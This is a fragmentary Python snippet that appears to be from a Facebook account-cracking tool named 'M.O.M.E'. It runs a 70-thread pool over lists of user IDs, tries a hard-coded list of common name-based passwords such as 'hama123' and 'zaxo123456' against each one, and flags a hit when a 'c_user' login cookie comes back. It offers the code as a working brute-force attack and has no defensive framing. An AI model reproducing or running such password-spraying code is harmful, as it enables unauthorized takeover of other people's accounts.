...
\033[1;37m[-] NEM TOOL   :\033[1;32m  M.O.M.E
    ...
    with ThreadPool(max_workers=70) as manshera:
        ...
        for love in user:
            ...
            for Eman in HamiiID:
                ...
                pwx.append('hama123qwer')
                pwx.append('hama123aa')
                pwx.append('hama12341234')
                pwx.append('ali112233')
                pwx.append('ali12345')
                pwx.append('ali123321')
                ...
                pwx.append('dana11223344')
                pwx.append('dana112233')
                pwx.append('ahmad123')
                ...
                pwx.append('hama0000')
                pwx.append('hama112233')
                pwx.append('muhamad123')
                pwx.append('muhamad123321')
                pwx.append('muhamad12345')
                pwx.append('muhamad123456')
                pwx.append('muhamad1212')
                pwx.append('hama1020')
                pwx.append('hama102030')            
                pwx.append('zaxo123456')
                pwx.append('zaxo123')
                pwx.append('zaxo12344321')
                pwx.append('zaxozaxo')
                pwx.append('zaxozaxo1212')
                pwx.append('zaxozaxo123321')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write('\r[MOME] [%s/%s]  \033[1;92❤️🔥🙈mOK\033[1;97m|  \r'%(loop,tl,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}IPYTHONI{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
